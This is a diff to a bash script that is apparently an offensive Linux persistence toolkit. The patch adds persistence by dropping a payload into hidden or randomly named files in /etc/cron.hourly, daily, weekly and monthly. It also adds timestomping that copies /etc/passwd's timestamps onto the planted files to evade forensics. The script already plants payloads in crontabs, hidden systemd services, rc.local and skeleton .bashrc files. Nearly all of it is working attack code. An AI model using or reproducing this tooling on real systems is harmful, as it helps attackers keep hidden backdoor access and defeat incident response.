@@ -11,8 +11,10 @@ VALIDSYNTAX=0
 PRINTCOMMANDS=0
 LIMIT=0
 STEALTHMODE=0
+TIMESTOMP=0
 REMOVALTOOL=$(which srm) || REMOVALTOOL=$(which rm)
 RANDOMPHPFILE=$(echo $(uuidgen).php)
+RANDOMCRONFILE=$(echo $(uuidgen))
 RANDOMPORT=$(expr 1024 + $RANDOM)
 SHELL="/bin/bash"
 SERVICEFILE=$(echo $(uuidgen).service)
@@ -150,11 +152,16 @@ stealth_modifications() {
     then
 	local a b c d ip=$RHOST
 	IFS=. read -r a b c d <<< "$ip"
-	export RHOST=$((a * 256 ** 3 + b * 256 ** 2 + c * 256 + d))
+	export RHOST_DECIMAL=$((a * 256 ** 3 + b * 256 ** 2 + c * 256 + d))
 	unset IFS
+	if [ $RHOST_DECIMAL -eq 0 ];
+	then
+	    RHOST_DECIMAL="0.0.0.0"
+	fi
     fi
 
     DISABLEBASHRC=1
+    TIMESTOMP=1
     SERVICEFILE=$(echo /etc/systemd/system/.$(uuidgen).service)
     SERVICESHELLSCRIPT=$(echo /etc/systemd/system/.$(uuidgen))
     CRONDFILE=.$(echo $(uuidgen | tr -d '-'))
@@ -293,6 +300,10 @@ enum_doors() {
 	"/var/spool/cron/crontabs/$(whoami) , crontab -l > $TMPCRON; echo \"* * * * * echo linper\" >> $TMPCRON; crontab $TMPCRON; crontab -l > $TMPCRON; cat $TMPCRON | grep -v linper > $TMPCRONWITHPAYLOAD; crontab $TMPCRONWITHPAYLOAD; if grep -qi [A-Za-z0-9] $TMPCRONWITHPAYLOAD; then crontab $TMPCRONWITHPAYLOAD; else crontab -r; fi; grep linper -qi $TMPCRON , echo \"$CRON $PAYLOAD\" >> $TMPCRONWITHPAYLOAD; crontab $TMPCRONWITHPAYLOAD && chmod +x $TMPCRONWITHPAYLOAD?"
 	"/etc/crontab , find /etc/ -type f -name crontab -writable | grep -qi crontab , echo \"$CRON $(whoami) $PAYLOAD\" >> /etc/crontab?"
 	"/etc/cron.d/ , find /etc/cron.d/ -type d -writable | head -n 1 | grep cron 2> /dev/null 1>&2 , echo \"$CRON $(whoami) $PAYLOAD\" >> /etc/cron.d/$CRONDFILE?"
+	"/etc/cron.hourly/ , find /etc/cron.hourly/ -type d -writable 2> /dev/null | head -n 1 | grep -q hourly , if head -n 1 /etc/cron.hourly/$RANDOMCRONFILE | grep -q '#!/bin/bash'; then echo \"$PAYLOAD\" >> /etc/cron.hourly/$RANDOMCRONFILE; else echo \"#!/bin/bash\" > /etc/cron.hourly/$RANDOMCRONFILE; echo \"$PAYLOAD\" >> /etc/cron.hourly/$RANDOMCRONFILE; chmod +x /etc/cron.hourly/$RANDOMCRONFILE?"
+	"/etc/cron.daily/ , find /etc/cron.daily/ -type d -writable 2> /dev/null | head -n 1 | grep -q daily , if head -n 1 /etc/cron.daily/$RANDOMCRONFILE | grep -q '#!/bin/bash'; then echo \"$PAYLOAD\" >> /etc/cron.daily/$RANDOMCRONFILE; else echo \"#!/bin/bash\" > /etc/cron.daily/$RANDOMCRONFILE; echo \"$PAYLOAD\" >> /etc/cron.daily/$RANDOMCRONFILE; chmod +x /etc/cron.daily/$RANDOMCRONFILE?"
+	"/etc/cron.weekly/ , find /etc/cron.weekly/ -type d -writable 2> /dev/null | head -n 1 | grep -q weekly , if head -n 1 /etc/cron.weekly/$RANDOMCRONFILE | grep -q '#!/bin/bash'; then echo \"$PAYLOAD\" >> /etc/cron.weekly/$RANDOMCRONFILE; else echo \"#!/bin/bash\" > /etc/cron.weekly/$RANDOMCRONFILE; echo \"$PAYLOAD\" >> /etc/cron.weekly/$RANDOMCRONFILE; chmod +x /etc/cron.weekly/$RANDOMCRONFILE?"
+	"/etc/cron.monthly/ , find /etc/cron.monthly/ -type d -writable 2> /dev/null | head -n 1 | grep -q monthly , if head -n 1 /etc/cron.monthly/$RANDOMCRONFILE | grep -q '#!/bin/bash'; then echo \"$PAYLOAD\" >> /etc/cron.monthly/$RANDOMCRONFILE; else echo \"#!/bin/bash\" > /etc/cron.monthly/$RANDOMCRONFILE; echo \"$PAYLOAD\" >> /etc/cron.monthly/$RANDOMCRONFILE; chmod +x /etc/cron.monthly/$RANDOMCRONFILE?"
 	"/etc/systemd/ , find /etc/systemd/ -type d -writable | head -n 1 | grep -qi systemd , echo \"$PAYLOAD\" >> /etc/systemd/system/$SERVICESHELLSCRIPT; if test -f /etc/systemd/system/$SERVICEFILE; then echo > /dev/null; else touch /etc/systemd/system/$SERVICEFILE; echo \"[Service]\" >> /etc/systemd/system/$SERVICEFILE; echo \"Type=oneshot\" >> /etc/systemd/system/$SERVICEFILE; echo \"ExecStartPre=$(which sleep) 60\" >> /etc/systemd/system/$SERVICEFILE; echo \"ExecStart=$(which $SHELL) /etc/systemd/system/$SERVICESHELLSCRIPT\" >> /etc/systemd/system/$SERVICEFILE; echo \"ExecStartPost=$(which sleep) infinity\" >> /etc/systemd/system/$SERVICEFILE; echo \"[Install]\" >> /etc/systemd/system/$SERVICEFILE; echo \"WantedBy=multi-user.target\" >> /etc/systemd/system/$SERVICEFILE; chmod 644 /etc/systemd/system/$SERVICEFILE; systemctl start $SERVICEFILE 2> /dev/null & sleep .0001; systemctl enable $SERVICEFILE 2> /dev/null & sleep .0001; fi;?"
 	"/etc/rc.local , if test -f /etc/rc.local; then touch /etc/rc.local; else touch /etc/rc.local &&  /etc/rc.local; fi , if test -f /etc/rc.local; then LINES=\$(expr \`cat /etc/rc.local | wc -l\` - 1); cat /etc/rc.local | head -n \$LINES > $TMPRCLOCAL; echo \"$PAYLOAD\" >> $TMPRCLOCAL; echo \"exit 0\" >> $TMPRCLOCAL; mv $TMPRCLOCAL /etc/rc.local; else echo \"#!/bin/sh -e\" > /etc/rc.local; echo $PAYLOAD >> /etc/rc.local; echo \"exit 0\" >> /etc/rc.local; fi; chmod +x /etc/rc.local?"
 	"/etc/skel/.bashrc , find /etc/skel/.bashrc -writable | grep -q bashrc , echo \"$PAYLOAD 2> /dev/null 1>&2 & sleep .0001\" >> /etc/skel/.bashrc?"
@@ -321,6 +332,10 @@ enum_doors() {
 			    if [ "$PRINTCOMMANDS" -eq 1 ];
 			    then
 				echo "[+] Command Used for Installation: $HINGE"
+				if [ "$TIMESTOMP" -eq 1 ];
+				then
+				    echo "[+] Command Used for Timestomping: find -type f $DOOR 2> /dev/null | egrep \"$RHOST|$RHOST_DECIMAL\" | xargs touch -r /etc/passwd"
+				fi
 				echo
 			    fi
 			    if [ "$DRYRUN" -eq 0 ];
@@ -329,6 +344,11 @@ enum_doors() {
 				if [ $? -eq 0 ];
 				then
 				    echo -e "\e[92m[+]\e[0m Persistence Installed: $METHOD using $DOOR"
+				    if [ $TIMESTOMP -eq 1 ];
+				    then
+					find $DOOR 2> /dev/null | xargs touch -r /etc/passwd
+					echo -e "\e[92m[+]\e[0m Timestomped Door: $DOOR"
+				    fi
 				    COUNTER=$(expr $COUNTER + 1)
 				    limit_checker $COUNTER
 				fi
@@ -520,7 +540,7 @@ cleanup() {
 	fi
     fi
 
-    for i in $(find $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}') /etc/cron.d/ -writable -type f 2> /dev/null);
+    for i in $(find $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}') /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/ -writable -type f 2> /dev/null);
     do
 	egrep -qi "$1|$RHOST_DECIMAL" $i 2> /dev/null
 	if [[ $? -eq 0 ]];
